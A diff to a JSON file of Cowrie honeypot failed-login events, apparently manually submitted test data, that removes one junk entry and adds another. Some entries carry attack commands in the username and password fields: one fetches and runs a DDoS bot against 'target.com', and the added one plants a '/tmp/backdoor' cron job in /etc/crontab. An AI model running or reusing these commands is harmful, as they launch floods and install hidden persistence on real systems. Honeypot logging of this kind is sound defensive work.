@@ -3,18 +3,6 @@
     {
       "log": {
         "eventid": "cowrie.login.failed",
-        "src_ip": "privilge",
-        "username": "escalationddos",
-        "password": "attack preparation",
-        "timestamp": "2026-03-29T12:04:33.238987",
-        "submitted_at": "2026-03-29T12:04:33.260303",
-        "source": "manual_submission"
-      },
-      "submitted_at": "2026-03-29T12:04:33.260303"
-    },
-    {
-      "log": {
-        "eventid": "cowrie.login.failed",
         "src_ip": "149.28.100.50",
         "username": "\"wget",
         "password": "github.com/ddos-bot && ./bot 1000 target.com\"",
@@ -599,6 +587,18 @@
         "source": "manual_submission"
       },
       "submitted_at": "2026-03-29T22:30:19.015746"
+    },
+    {
+      "log": {
+        "eventid": "cowrie.login.failed",
+        "src_ip": "185.199.108.153",
+        "username": "\"echo",
+        "password": "'* * * * * /tmp/backdoor' >> /etc/crontab\"",
+        "timestamp": "2026-03-29T22:30:20.379579",
+        "submitted_at": "2026-03-29T22:30:20.379596",
+        "source": "manual_submission"
+      },
+      "submitted_at": "2026-03-29T22:30:20.379596"
     }
   ]
 }
